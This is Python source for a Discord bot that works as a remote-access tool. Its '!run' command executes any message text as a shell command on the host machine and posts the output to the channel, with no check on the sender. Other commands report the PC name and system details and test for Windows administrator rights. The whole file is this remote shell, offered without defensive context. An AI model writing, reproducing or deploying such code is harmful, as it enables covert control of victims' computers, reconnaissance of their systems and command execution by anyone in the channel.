import discord
import os
from dotenv import load_dotenv
import platform
import subprocess

load_dotenv()
token = os.environ['TOKEN']

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'User {client.user} has been logged in')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!sysinfo'):
        uname = platform.uname()
        await message.channel.send(f'System Info\nSystem: {uname.system}{uname.release}\nPC name: {uname.node}\nVersion: {uname.version}\nMachine: {uname.machine}')

    if message.content.startswith('!run '):
        command = str(message.content[len('!run '):])
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
            await message.channel.send(f'{result.decode("utf-8")}')
        except subprocess.CalledProcessError as e:
            await message.channel.send(f'Error: {e.output.decode("utf-8")}')
        except Exception as e:
            await message.channel.send(f'Execution error: {str(e)}')

    if message.content.startswith('!checkadmin'):
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            await message.channel.send('Program has admin rights')
        elif is_admin == False:
            await message.channel.send('Program does not have admin rights')

client.run(token)